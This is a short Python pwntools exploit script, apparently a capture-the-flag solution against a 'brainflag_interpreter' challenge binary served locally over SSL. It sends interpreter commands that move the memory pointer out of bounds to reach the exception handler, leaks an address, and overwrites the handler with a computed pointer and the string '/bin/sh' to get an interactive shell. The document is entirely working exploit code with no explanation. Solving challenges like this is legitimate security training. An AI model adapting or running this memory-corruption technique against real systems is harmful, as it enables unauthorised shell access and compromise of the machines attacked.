from pwn import *

context.terminal = ["ghostty", "-e"]
context.binary = elf = ELF("./container/brainflag_interpreter")

io = remote("localhost", 50000, ssl=True)
payload = b"<" * (elf.sym.memory - elf.sym.exception_handler) + b".>" * 8 + b"<" * 8 + b",>" * 16 + b"<" * 8 + b"@"
# io = process([elf.path, payload])
# gdb.attach(io)

io.recvuntil(b"execute: ")
io.sendline(payload)
payload2 = p64(u64(io.recv(8)) - elf.sym.default_exception_handler + 0x9388) + b"/bin/sh\0"
print(payload2)
print(len(payload2))
io.sendline(payload2)
io.interactive()
